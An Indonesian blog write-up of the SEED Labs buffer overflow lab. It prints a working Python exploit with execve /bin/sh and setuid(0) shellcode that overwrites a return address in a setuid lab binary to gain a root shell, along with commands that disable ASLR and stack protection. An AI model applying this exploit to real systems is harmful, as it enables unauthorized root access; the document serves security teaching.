<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="">
<meta name="description"
    content="0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/buffer_overflow_labs_from_seedlabs/" />


<title>
    
    Buffer_Overflow_Labs_From_SEEDlabs :: Hello World. I am Dito Prabowo 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.1e3781b80dd16493473cb3568a87d70e1a30cee34b5558dc6a9114b007652d4d.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="Buffer_Overflow_Labs_From_SEEDlabs">
<meta itemprop="description" content="0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.">
<meta itemprop="datePublished" content="2019-10-11T20:25:58&#43;07:00" />
<meta itemprop="dateModified" content="2019-10-11T20:25:58&#43;07:00" />
<meta itemprop="wordCount" content="1351">
<meta itemprop="image" content="/"/>



<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="Buffer_Overflow_Labs_From_SEEDlabs"/>
<meta name="twitter:description" content="0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya."/>




<meta property="article:published_time" content="2019-10-11 20:25:58 &#43;0700 WIB" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ cd /home/dmcr7</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>7 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title"><a href="/posts/buffer_overflow_labs_from_seedlabs/">Buffer_Overflow_Labs_From_SEEDlabs</a></h1>

            

            <div class="post-content">
                <h2 id="0x00-intro">0x00 Intro</h2>
<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>
<h2 id="0x01-guide">0x01 Guide</h2>
<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>
<p>Untuk file yang dibutuhkan :</p>
<ol>
<li>
<p>stack.c (the vulnerable program)</p>
</li>
<li>
<p>call_shellcode.c</p>
</li>
<li>
<p>Exploit.py (Buat Sendiri)</p>
</li>
</ol>
<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>
<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>
<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>
<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>
<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>
<p>Adapun step step yang harus kita lakukan :</p>
<ol>
<li>
<p>Mematikan Address Space Randomization pada VM.</p>
</li>
<li>
<p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p>
</li>
<li>
<p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p>
</li>
<li>
<p>Mencari offset untuk return address</p>
</li>
<li>
<p>Mencari alamat Buffer</p>
</li>
<li>
<p>Membuat Payload dan mengeksekusi</p>
</li>
</ol>
<h2 id="0x02-lab">0x02 LAB</h2>
<h3 id="task-1--exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>
<h4 id="1mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>
<p>Mematikan ASLR dapat kita lakukan dengan command :</p>
<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>
<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>
<h4 id="2mengcompile-file-stackc-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>
<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>
<pre><code>*** stack smashing detected : ./stack terminated
</code></pre>
<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>
<p>Untuk command nya</p>
<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
chmod 4755 stack
</code></pre>
<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call_shellcodec">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>
<p>Compile call_shellcode.c dengan menggunakan perintah :</p>
<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
</code></pre>
<p>Setelah berhasil lalu jalankan program</p>
<pre><code>./call_shellcode
</code></pre>
<p>Hasilnya :</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>
<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>
<p>pada terminal lakukan gdb pada program stack</p>
<pre><code>gdb -q stack
</code></pre>
<p>lalu buat pattern untuk mencari nilai offset return address</p>
<pre><code>pattern create 40
</code></pre>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

<span style="color:#75715e"># Fill the content with NOP&#39;s</span>
content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">40</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&#34;</span>

<span style="color:#75715e"># Write the content to badfile</span>
file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
file<span style="color:#f92672">.</span>write(content)
file<span style="color:#f92672">.</span>close()
</code></pre></div><p>lalu jalankan(di terminal baru) dengan command  :</p>
<pre><code>python exploit.py
</code></pre>
<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>
<p>akan muncul invalid</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>
<pre><code>pattern offset 0x61414145
</code></pre>
<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h4 id="5mencari-alamat-buffer">5.Mencari alamat Buffer</h4>
<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>
<pre><code>$ gdb -q stack
gdb-peda$ pdisass main
</code></pre>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Dump of assembler code <span style="color:#66d9ef">for</span> function main:
   <span style="color:#ae81ff">0x080484da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	lea    ecx,[esp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x080484de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	<span style="color:#f92672">and</span>    esp,<span style="color:#ae81ff">0xfffffff0</span>
   <span style="color:#ae81ff">0x080484e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x080484e4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>:	push   ebp
   <span style="color:#ae81ff">0x080484e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    ebp,esp
   <span style="color:#ae81ff">0x080484e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">&gt;</span>:	push   ecx
   <span style="color:#ae81ff">0x080484e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x214</span>
   <span style="color:#ae81ff">0x080484ee</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x8</span>
   <span style="color:#ae81ff">0x080484f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d0</span>
   <span style="color:#ae81ff">0x080484f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d2</span>
   <span style="color:#ae81ff">0x080484fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80483a0</span> <span style="color:#f92672">&lt;</span>fopen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x08048500</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048503</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>],eax
   <span style="color:#ae81ff">0x08048506</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>]
   <span style="color:#ae81ff">0x08048509</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x205</span>
   <span style="color:#ae81ff">0x0804850e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x1</span>
   <span style="color:#ae81ff">0x08048510</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
   <span style="color:#ae81ff">0x08048516</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:	push   eax
   <span style="color:#ae81ff">0x08048517</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">61</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048360</span> <span style="color:#f92672">&lt;</span>fread<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804851c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">66</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x0804851f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x08048522</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
   <span style="color:#ae81ff">0x08048528</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:	push   eax
   <span style="color:#ae81ff">0x08048529</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80484bb</span> <span style="color:#f92672">&lt;</span>bof<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804852e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">84</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048531</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x08048534</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485da</span>
   <span style="color:#ae81ff">0x08048539</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048380</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804853e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048541</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x1</span>
   <span style="color:#ae81ff">0x08048546</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">108</span><span style="color:#f92672">&gt;</span>:	mov    ecx,DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x08048549</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:	leave  
   <span style="color:#ae81ff">0x0804854a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    esp,[ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x0804854d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:	ret    
End of assembler dump<span style="color:#f92672">.</span>
</code></pre></div><p>kita break saat memamnggil function bof</p>
<pre><code>gdb-peda$ b *main+79
Breakpoint 1 at 0x8048529
gdb-peda$ r
</code></pre>
<p>.*</p>
<p>pada stack terlihat alamat str mulai mengisi nilai
pada alamat tertentu yaitu</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea37</span>
</code></pre></div><p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>
<p>kita buat saja return address nya</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea77</span>
</code></pre></div><h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>
<p>payload =</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

shellcode<span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># xorl    %eax,%eax              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;//sh&#34;</span>           <span style="color:#75715e"># pushl   $0x68732f2f            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;/bin&#34;</span>           <span style="color:#75715e"># pushl   $0x6e69622f            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ebx              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %ebx                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ecx              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># cdq                            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movb    $0x0b,%al              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># int     $0x80                  </span>
)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)


offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>
content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
start <span style="color:#f92672">=</span> <span style="color:#ae81ff">517</span> <span style="color:#f92672">-</span> len(shellcode)
returna <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\xea\xff\xbf</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
content[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> returna
content[start:] <span style="color:#f92672">=</span> shellcode
file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
file<span style="color:#f92672">.</span>write(content)
file<span style="color:#f92672">.</span>close()
</code></pre></div><p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>
<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>
<pre><code>python3 exploit.py
./StackGuard
</code></pre>
<p>jika berhasil akan mengarahkan kita ke shellcode</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --></p>
<p>Exploit berhasil kita lakukan</p>
<hr>
<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>
<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>
<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
</code></pre>
<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>
<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
</code></pre>
<p>kita lakukan loop sampai program bisa tereksekusi.</p>
<p>Bukti :</p>
<p><img src="/img/task2.png" alt=""></p>
<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>
<p><img src="/img/prosestask2.png" alt=""></p>
<p>Setelah mendapat shell (akhirnyaaaa) :
<img src="/img/hasiltask2.png" alt=""></p>
<hr>
<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>
<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>
<p>Hasil :
<img src="/img/task3.png" alt=""></p>
<hr>
<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>
<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>
<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
</code></pre>
<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>
<p>Hasil :</p>
<p><img src="/img/task4.png" alt=""></p>
<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>
<hr>
<h3 id="task-5-defeating-dashs-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>
<p>Kita coba dulu program untuk mendapatkan shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objective-c" data-lang="objective-c"><span style="color:#75715e">// dash_shell_test.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">2</span>];
argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> NULL;
<span style="color:#75715e">// setuid(0); ➀
</span><span style="color:#75715e"></span>execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>**.</p>
<p>Maka akan mendapat kan root :
<img src="/img/t5.png" alt=""></p>
<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
<img src="/img/t51.png" alt=""></p>
<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">har shellcode[] <span style="color:#f92672">=</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">1</span>: xorl <span style="color:#f92672">%</span>eax,<span style="color:#f92672">%</span>eax <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">2</span>: xorl <span style="color:#f92672">%</span>ebx,<span style="color:#f92672">%</span>ebx <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\xd5</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">3</span>: movb <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0xd5</span>,<span style="color:#f92672">%</span>al <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">4</span>: int <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0x80</span> <span style="color:#f92672">*/</span>
</code></pre></div><p>akan mendapatkan root :
<img src="/img/t52.png" alt=""></p>
